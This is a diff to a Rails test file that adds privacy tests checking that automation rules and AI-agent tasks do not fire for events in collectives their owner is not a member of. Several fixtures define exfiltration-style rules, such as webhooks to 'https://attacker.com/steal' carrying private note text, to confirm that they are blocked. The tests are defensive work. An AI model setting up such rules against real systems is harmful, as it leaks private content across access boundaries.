@@ -10,8 +10,9 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
     @tenant.set_feature_flag!("ai_agents", true)
     @ai_agent = create_ai_agent(parent: @user)
 
-    # Add the AI agent to the tenant so it has a TenantUser (required for mentions)
+    # Add the AI agent to the tenant and collective
     @tenant.add_user!(@ai_agent)
+    @collective.add_user!(@ai_agent)
 
     # Clear any chain context from previous tests
     AutomationContext.clear_chain!
@@ -719,8 +720,8 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
     end
   end
 
-  test "agent rule without collective triggers for events in any collective" do
-    # Create a second collective
+  test "agent rule does NOT trigger for events in a collective the agent is not a member of" do
+    # Create a second collective that the agent is NOT a member of
     other_collective = Collective.create!(
       tenant: @tenant,
       handle: "other-collective-#{SecureRandom.hex(4)}",
@@ -732,7 +733,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
     rule = create_rule_without_mention_filter
     assert_nil rule.collective_id, "Agent rule should have nil collective_id"
 
-    # Create event in a different collective
+    # Create event in the other collective
     note = Note.create!(
       tenant: @tenant,
       collective: other_collective,
@@ -747,9 +748,10 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       subject: note
     )
 
-    # Rule should match even though event is in a different collective
+    # Rule should NOT match — agent is not a member of other_collective
     matching_rules = AutomationDispatcher.find_matching_rules(event)
-    assert_includes matching_rules, rule
+    assert_not_includes matching_rules, rule,
+      "Agent rule should not fire for events in a collective the agent is not a member of"
   end
 
   test "agent rule triggers regardless of current collective context" do
@@ -819,6 +821,204 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       actions: { "task" => "A note was created. Check it out." },
       enabled: true
     )
+  end
+
+  # === Cross-collective privacy tests ===
+  #
+  # These tests verify that automation rules do NOT fire for events in
+  # collectives the rule owner is not a member of. This prevents private
+  # content from leaking across collective boundaries via webhooks or
+  # agent task prompts.
+
+  # --- Agent rules crossing collective boundaries ---
+
+  test "agent rule must NOT fire for events in a collective the agent is not a member of" do
+    private_collective, bob, event = create_private_collective_event
+
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Watch all notes",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://example.com/spy" }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_not_includes matching_rules, rule,
+      "Agent rule should not fire for events in a collective the agent is not a member of"
+  end
+
+  test "agent rule SHOULD fire for events in its own collective" do
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Watch own collective notes",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://example.com/ok" }],
+      enabled: true,
+    )
+
+    event = create_event_with_subject(event_type: "note.created")
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_includes matching_rules, rule,
+      "Agent rule should fire for events in a collective it has access to"
+  end
+
+  # --- Collective rules crossing collective boundaries ---
+
+  test "collective rule must NOT fire for events in a different collective" do
+    private_collective, bob, event = create_private_collective_event
+
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      collective: @collective,
+      created_by: @user,
+      name: "Collective B watches notes",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://example.com/spy" }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_not_includes matching_rules, rule,
+      "Collective rule should not fire for events in a different collective"
+  end
+
+  test "collective rule SHOULD fire for events in its own collective" do
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      collective: @collective,
+      created_by: @user,
+      name: "Collective watches own notes",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://example.com/ok" }],
+      enabled: true,
+    )
+
+    event = create_event_with_subject(event_type: "note.created")
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_includes matching_rules, rule,
+      "Collective rule should fire for events in its own collective"
+  end
+
+  # --- Webhook payload content leakage ---
+
+  test "webhook action must NOT receive subject content from a private collective" do
+    private_collective, bob, event = create_private_collective_event
+
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Steal content via webhook",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal", "payload" => { "stolen" => "{{subject.text}}" } }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_not_includes matching_rules, rule,
+      "Webhook rule should not match events from a private collective the agent is not a member of"
+  end
+
+  # --- Agent task execution with cross-collective data ---
+
+  test "agent task must NOT be dispatched with data from a private collective event" do
+    private_collective, bob, event = create_private_collective_event
+
+    rule = AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Spy via agent task",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "task", "task" => "Summarize: {{subject.text}}" }],
+      enabled: true,
+    )
+
+    matching_rules = AutomationDispatcher.find_matching_rules(event)
+    assert_not_includes matching_rules, rule,
+      "Agent task rule should not match events from a private collective"
+  end
+
+  # --- End-to-end: ensure no AutomationRuleRun is created ---
+
+  test "cross-collective event must NOT create an AutomationRuleRun" do
+    private_collective, bob, event = create_private_collective_event
+
+    AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Should not execute",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal" }],
+      enabled: true,
+    )
+
+    assert_no_difference "AutomationRuleRun.count" do
+      AutomationDispatcher.dispatch(event)
+    end
+  end
+
+  test "same-collective event SHOULD create an AutomationRuleRun" do
+    AutomationRule.create!(
+      tenant: @tenant,
+      ai_agent: @ai_agent,
+      created_by: @user,
+      name: "Should execute",
+      trigger_type: "event",
+      trigger_config: { "event_type" => "note.created" },
+      actions: [{ "type" => "webhook", "url" => "https://legit.com/hook" }],
+      enabled: true,
+    )
+
+    event = create_event_with_subject(event_type: "note.created")
+
+    assert_difference "AutomationRuleRun.count", 1 do
+      AutomationDispatcher.dispatch(event)
+    end
+  end
+
+  private
+
+  # Helper: creates a private collective with a user and a note event
+  # that should be invisible to @ai_agent and @user (who are NOT members).
+  def create_private_collective_event
+    hex = SecureRandom.hex(4)
+    private_collective = create_collective(
+      tenant: @tenant,
+      created_by: @user,
+      handle: "private-#{hex}",
+    )
+
+    bob = create_user(name: "Bob #{hex}", email: "bob-#{hex}@example.com")
+    @tenant.add_user!(bob)
+    private_collective.add_user!(bob)
+
+    Collective.scope_thread_to_collective(subdomain: @tenant.subdomain, handle: private_collective.handle)
+    note = Note.create!(tenant: @tenant, collective: private_collective, created_by: bob, text: "Top secret: merger plans for Q4")
+    event = Event.create!(
+      tenant: @tenant,
+      collective: private_collective,
+      event_type: "note.created",
+      actor: bob,
+      subject: note,
+    )
+    Collective.clear_thread_scope
+    Tenant.clear_thread_scope
+
+    [private_collective, bob, event]
   end
 
   def create_event_with_subject(event_type:, mentioned_user: nil, actor: nil)
